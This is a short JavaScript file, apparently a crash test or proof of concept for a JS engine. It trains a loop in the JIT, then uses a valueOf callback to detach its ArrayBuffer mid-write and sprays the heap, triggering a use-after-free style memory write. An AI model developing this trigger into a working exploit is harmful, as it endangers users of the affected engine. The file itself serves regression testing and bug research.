var arr=new Array(0x1000)
function occupy()
{
    for(var i=0;i<0x1000;i++)
    {
        arr[i]=new Array(0x800);
        arr[i][1]=1;
        arr[i][0]=1;
    }
}


function gc()
{
    if(buffer)
    {
        SCA.deserialize(SCA.serialize(buffer, { "context" : "crossthread" }, null, [buffer]));
        buffer=null;
        occupy();
    }
}

function func(a,b, c) {
    for(var i=8;i<0x1000;i++)
    {
        a[i]=0x18000
        b.setUint32(i % 30,c)
    }
}

var wow;
buffer=new ArrayBuffer(0x10000);
var element_0=new Uint32Array(buffer)
element_1=new DataView(new ArrayBuffer(0x30))
for(var i=0;i<200;i++){func(element_0,element_1,{});}
try {
  func(element_0,element_1,{valueOf: () => {gc();return 1}});
}
catch(e) {}
print('pass');

